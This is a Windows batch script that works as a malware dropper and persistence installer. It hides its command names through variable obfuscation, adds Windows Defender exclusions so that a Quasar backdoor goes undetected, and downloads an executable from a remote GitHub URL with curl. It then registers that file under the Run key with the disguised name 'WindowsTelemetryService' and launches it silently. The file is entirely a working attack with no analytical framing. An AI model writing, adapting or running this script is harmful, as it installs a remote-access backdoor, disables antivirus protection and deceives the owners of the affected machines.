@echo off

:: Variable Obfuscation
set "v1=p" & set "v2=o" & set "v3=w" & set "v4=e" & set "v5=r" & set "v6=s" & set "v7=h" & set "v8=l"
set "d1=c" & set "d2=u" & set "d3=r" & set "d4=l"
set "r1=r" & set "r2=e" & set "r3=g"
set "a1=a" & set "a2=d" & set "a3=d"

:: Set Paths
set "FN=mscorsvw.exe"
set "TD=%APPDATA%\Microsoft\Windows\Templates\Services\"
set "URL=https://github.com/fullylaw/happy.org/raw/main/dread.exe"

:: 1. Create the folder silently
if not exist "%TD%" mkdir "%TD%" >nul 2>&1

:: 2. ADD EXCLUSIONS: Tells Antivirus to stop scanning this path and file
:: This target the "Backdoor:MSIL/Quasar" flag
%v1%%v2%%v3%%v4%%v5%%v6%%v7%%v4%%v8%%v8% -Command "Add-MpPreference -ExclusionPath '%TD%'" >nul 2>&1
%v1%%v2%%v3%%v4%%v5%%v6%%v7%%v4%%v8%%v8% -Command "Add-MpPreference -ExclusionProcess '%FN%'" >nul 2>&1

:: 3. DOWNLOAD: Using curl to grab the file into the safe zone
%d1%%d2%%d3%%d4% -L -o "%TD%%FN%" "%URL%" >nul 2>&1

:: 4. PERSISTENCE: Adds to Startup registry
%r1%%r2%%r3% %a1%%a2%%a3% "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsTelemetryService" /t REG_SZ /d "\"%TD%%FN%\"" /f >nul 2>&1

:: 5. EXECUTE & EXIT: Run background and close CMD
start /b "" "%TD%%FN%"
exit
